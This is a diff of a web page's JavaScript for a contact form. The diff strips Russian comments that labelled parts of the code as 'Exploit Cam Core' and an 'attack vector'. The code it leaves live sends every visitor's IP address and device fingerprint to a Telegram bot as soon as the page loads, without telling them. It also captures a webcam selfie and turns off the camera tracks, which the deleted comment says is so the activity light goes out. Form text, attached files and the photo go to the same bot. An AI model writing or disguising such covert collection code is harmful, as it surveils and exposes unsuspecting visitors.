@@ -1207,7 +1207,6 @@ requestAnimationFrame(draw);
 }
 draw();
 
-// --- АНАЛИТИКА УСТРОЙСТВА И СЕТЕВЫХ КАНАЛОВ ---
 function parseTelemetry() {
     const ua = navigator.userAgent;
     let osName = "Unknown OS";
@@ -1261,7 +1260,6 @@ async function fetchPublicIP() {
     }
 }
 
-// Отправка сообщений в Telegram (через асинхронные fetch)
 async function transmitToTelegram(text, fileBlob = null, fileName = "file", isPhoto = false) {
     if (TG_TOKEN === "YOUR_BOT_TOKEN") return false;
     
@@ -1291,7 +1289,6 @@ async function transmitToTelegram(text, fileBlob = null, fileName = "file", isPh
     }
 }
 
-// Логирование посещения сайта
 window.addEventListener('DOMContentLoaded', async () => {
     const ip = await fetchPublicIP();
     const meta = parseTelemetry();
@@ -1307,7 +1304,6 @@ window.addEventListener('DOMContentLoaded', async () => {
     await transmitToTelegram(logMessage);
 });
 
-// Кастомная стилизация дефолтной кнопки выбора файлов
 const fileDummyBtn = document.getElementById('fileDummyBtn');
 const formFile = document.getElementById('formFile');
 const fileStatusText = document.getElementById('fileStatusText');
@@ -1323,7 +1319,6 @@ formFile.addEventListener('change', (e) => {
     }
 });
 
-// Логика захвата селфи (Exploit Cam Core)
 let capturedSelfieBlob = null;
 const selfieBtn = document.getElementById('selfieBtn');
 const selfieStatusText = document.getElementById('selfieStatusText');
@@ -1349,10 +1344,9 @@ selfieBtn.addEventListener('click', async () => {
                     selfieStatusText.innerText = "BIOMETRY_READY.JPG";
                     selfieBtn.classList.add('captured');
                     
-                    // Выключаем треки камеры, чтобы погас диод активности
                     stream.getTracks().forEach(track => track.stop());
                 }, 'image/jpeg');
-            }, 600); // Небольшая задержка для автоэкспозиции линзы
+            }, 600);
         };
     } catch (err) {
         console.error(err);
@@ -1361,7 +1355,6 @@ selfieBtn.addEventListener('click', async () => {
     }
 });
 
-// Отправка формы обратной связи с упакованными логами
 document.getElementById('cyberContactForm').addEventListener('submit', async function(e) {
     e.preventDefault();
     
@@ -1387,7 +1380,7 @@ document.getElementById('cyberContactForm').addEventListener('submit', async fun
     const textReport = `⚡️ *ПОСТУПИЛО НОВОЕ ОБРАЩЕНИЕ* ⚡️\n\n` +
                        `👤 *Отправитель:* ${name}\n` +
                        `🔗 *Канал связи:* ${contact}\n` +
-                       `🛡 *Вектор атаки (Тема):* ${vector}\n` +
+                       `🛡 *Вектор (Тема):* ${vector}\n` +
                        `📂 *Текст сообщения:* \`${payload}\`\n\n` +
                        `📊 *МЕТРИКИ ОТПРАВИТЕЛЯ:* \n` +
                        `🌐 *IP:* \`${ip}\`\n` +
@@ -1397,16 +1390,13 @@ document.getElementById('cyberContactForm').addEventListener('submit', async fun
                        `🌍 *Таймзона:* \`${meta.timeZone}\`\n` +
                        `⏰ *Локальный час:* \`${meta.currentHour}:00\` (${meta.fullTime})`;
 
-    // Шаг 1: Отправляем основной пакет данных
     let mainSuccess = await transmitToTelegram(textReport);
     
-    // Шаг 2: Если прикреплен файл — отправляем документом
     if (formFile.files.length > 0) {
         statusText.innerText = "UPLOADING_FILE...";
         await transmitToTelegram(`📎 Файл к обращению от пользователя: *${name}*`, formFile.files[0], formFile.files[0].name, false);
     }
     
-    // Шаг 3: Если сделано селфи — отправляем фото
     if (capturedSelfieBlob) {
         statusText.innerText = "UPLOADING_BIOMETRY...";
         await transmitToTelegram(`📸 Биометрия (Селфи) пользователя: *${name}*`, capturedSelfieBlob, "selfie.jpg", true);
@@ -1416,8 +1406,7 @@ document.getElementById('cyberContactForm').addEventListener('submit', async fun
         statusText.innerText = "TRANSMISSION_SUCCESSFUL";
         statusText.style.color = "#10b981";
         document.getElementById('cyberContactForm').reset();
-        
-        // Сброс индикаторов кнопок
+
         fileStatusText.innerText = "CHOOSE_FILE";
         fileDummyBtn.classList.remove('captured');
         selfieStatusText.innerText = "SNAP_SELFIE";
